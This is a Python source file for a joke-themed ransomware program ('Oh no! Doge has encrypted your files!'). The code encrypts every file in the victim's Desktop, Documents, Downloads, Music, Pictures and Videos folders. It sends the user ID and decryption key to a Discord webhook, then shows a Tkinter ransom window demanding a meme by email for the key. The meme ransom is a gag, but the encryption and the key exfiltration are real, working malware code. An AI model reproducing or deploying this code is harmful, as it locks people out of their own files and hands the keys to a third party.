import os
from nextcord import SyncWebhook
from cryptography.fernet import Fernet, InvalidToken
import random
import json
import time
import tkinter
import tkinter.messagebox

main_dirs = ["desktop", "documents", "downloads", "music", "pictures", "videos"]
home = os.path.expanduser("~")

if "override-directories.json" in os.listdir(home):
    with open(os.path.join(home, "override-directories.json"), "r") as f:
        main_dirs = json.load(f)["directories"]

data_file = os.path.join(home, "silliness.json")
webhook = SyncWebhook.from_url("YOUR WEBHOOK URL HERE")

def encrypt(filepath, key):
    with open(filepath, "rb") as f:
        contents = f.read()
    encrypted = Fernet(key).encrypt(contents)
    with open(filepath, "wb") as f:
        f.write(encrypted)

def decrypt(filepath, key):
    with open(filepath, "rb") as f:
        contents = f.read()
    decrypted = Fernet(key).decrypt(contents)
    with open(filepath, "wb") as f:
        f.write(decrypted)

def scan(func, key):
    count = 0
    for directory in os.listdir(home):
        if directory.lower() in main_dirs:
            for root, dirs, files in os.walk(os.path.join(home, directory)):
                for filename in files:
                    if filename not in ["sillyquip.exe", "sillyquip.py", "silliness.json", "override_directories.json"]:
                        try:
                            func(os.path.join(root, filename), key)
                        except:
                            pass
                        else:
                            count += 1

    return count


class Window(tkinter.Tk):
    def __init__(self):
        super().__init__()

        self.title("sillytime.exe")
        self.resizable(0, 0)
        self.geometry("750x300")

        with open(data_file, "r") as f:
            self.data = json.load(f)

        self.uid = self.data["id"]
        self.count = self.data["count"]

        webhook.send(f"Opening window for User `{self.uid}`")

        try:
            self.image = tkinter.PhotoImage(file="doge.png")
        except:
            self.image = tkinter.PhotoImage()

        self.label_image = tkinter.Label(self, image=self.image)
        self.label_title = tkinter.Label(self, justify="left", wraplength=430, font=("Comic Sans MS", 16, "bold"), fg="red", text="Oh no! Doge has encrypted your files!")
        self.label_info = tkinter.Label(self, justify="left", wraplength=360, font=("Comic Sans MS", 12, "normal"), text=f"That was really silly of him. To unlock your files, you must make a doge meme and send it to ransomdoge+{self.uid}@gmail.com. Your meme must be original, or Doge will be displeased. If your meme is to Doge's liking, he will send back a key that you can use to unlock your files.")
        self.key_input = tkinter.Entry(self, width=45, font=("Comic Sans MS", 10, "normal"))
        self.button = tkinter.Button(self, text="Unlock", command=self.try_key)
        
        self.label_image.pack(side="left", padx=10, pady=10)
        self.label_title.pack(anchor="w")
        self.label_info.pack(anchor="w")
        self.key_input.pack(side="left", anchor="s", padx=(0, 5), pady=10)
        self.button.pack(side="left", anchor="s", pady=10)
        
    def try_key(self):
        key = self.key_input.get()
        count = scan(decrypt, key)

        if count == 0:
            tkinter.messagebox.showerror("dumbass", "wtf you're key is wrong")
        
        else:
            webhook.send(f"User `{self.uid}` has unlocked {count} of {self.count} files")

            if count == self.count:
                tkinter.messagebox.showinfo("success", "thanks for the meme, your files have been unlocked")
            else:
                tkinter.messagebox.showinfo("success?", "thanks for the meme, your files have (probably) been unlocked")

            self.destroy()

            try:
                os.remove(data_file)
            except:
                pass

if "silliness.json" not in os.listdir(home):
    key = Fernet.generate_key().decode("utf-8")
    uid = str(random.randint(10000, 99999))

    data = {
        "_COMMENT": "Do not delete or modify this file! It contains information necessary for decrypting your system.",
        "id": uid,
        "key": key,
    }

    with open(data_file, "w") as f:
        json.dump(data, f)

    webhook.send(f"__**New User**__\nID: `{uid}`\nKey: `{key}`\nLocations: `{main_dirs}`\n\nBeginning encryption process...")
    start = time.process_time()

    count = scan(encrypt, key)
    webhook.send(f"Encrypted {count} files of User `{uid}` in {time.process_time() - start}")

    data["count"] = count
    with open(data_file, "w") as f:
        json.dump(data, f)

win = Window()
win.mainloop()